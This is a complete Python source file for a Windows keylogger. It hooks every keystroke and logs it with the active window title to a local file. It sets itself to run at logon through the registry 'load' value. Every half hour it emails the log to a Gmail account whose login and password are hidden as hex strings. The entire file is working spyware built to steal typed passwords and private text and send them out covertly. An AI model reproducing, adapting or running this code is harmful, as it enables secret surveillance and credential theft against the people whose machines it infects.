import pyHook
import smtplib
import threading
import time
from email.MIMEMultipart import MIMEMultipart
from email.MIMEBase import MIMEBase
from email import Encoders
import _winreg as winreg
import sys
import os 
from datetime import datetime

def sendMail():
	while True:
		time.sleep(1800)
		now = datetime.now()
		current = str(now.hour) + ":" + str(now.minute)
		server = smtplib.SMTP('smtp.gmail.com',587)
		server.starttls()
		liam = "64646f6e74686176653040676d61696c2e636f6d"
		ssap = "446f6e746765746974"
		server.login(liam.decode("hex"),ssap.decode("hex"))
		file = open("winData.txt","r")
		text = ""
		msg = MIMEMultipart()
		msg['From'] = liam.decode("hex")
		msg['To'] = liam.decode("hex")
		msg['Subject'] = str(os.getenv('username')) + " - " + current
		part = MIMEBase('application',"octet-stream")
		part.set_payload(open("winData.txt","rb").read())
		Encoders.encode_base64(part)

		part.add_header('Content-Disposition', 'attachment; filename="winData.txt"')
		
		msg.attach(part)

		server.sendmail(liam.decode("hex"),liam.decode("hex"), msg.as_string())
		server.quit()
		file.close()
		#time.sleep(3600)
		
t = threading.Thread(target=sendMail)

def writer(key, window):
	#print("[%s] - %s"%(window,key))
	windowName = ""

	if key == "1":
		key = "1 or !"
	if key == "2":
		key = "2 or @"
	if key == "3":
		key = "3 or #"
	if key == "4":
		key = "4 or $"
	if key == "5":
		key = "5 or %"
	if key == "7":
		key = "7 or &"
	if key == "8":
		key = "8 or *"
	if key == "9":
		key = "9 or ("
	if key == "0":
		key = "0 or )"
	if key == "Oem_3":
		key = "\" or '"
	if key == "Oem_Comma":
		key = ", or <"
	if key == "Oem_Minus":
		key = "- or _"
	if key == "Oem_Period":
		key = ". or >"
	if key == "Oem_Plus":
		key = "+ or ="
	if key == "Oem_1":
		key = "c"

	file = "winData.txt"
	f = open(file,"a")
	if window != windowName:
		f.write(" [ " + window + " ] " + "-- ")
		windowName = str(window)
	else:
		f.write(" [ " + windowName + " ] " + "-- ")
	f.write(key + "\n")
	f.close


def OnKeyBoardEvent(event):
	WindowName = event.WindowName
	key = event.Key
	writer(key,WindowName)
	return True

def autoRunReg():
	try:
		fileName = os.path.basename(sys.argv[0])
		dirFile = """%s\\%s""" %(os.getcwd() ,fileName)
		if(str(os.getcwd()) != "C:\\WINDOWS\\"):
			value = (dirFile)
			print value

			key = winreg.CreateKey(winreg.HKEY_CURRENT_USER,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows")
			winreg.SetValueEx(key, "load", None, winreg.REG_SZ, value)
	except: pass

ch  = pyHook.HookManager() 
ch.KeyDown = OnKeyBoardEvent 
ch.HookKeyboard()
autoRunReg();
t.start()
import pythoncom
pythoncom.PumpMessages()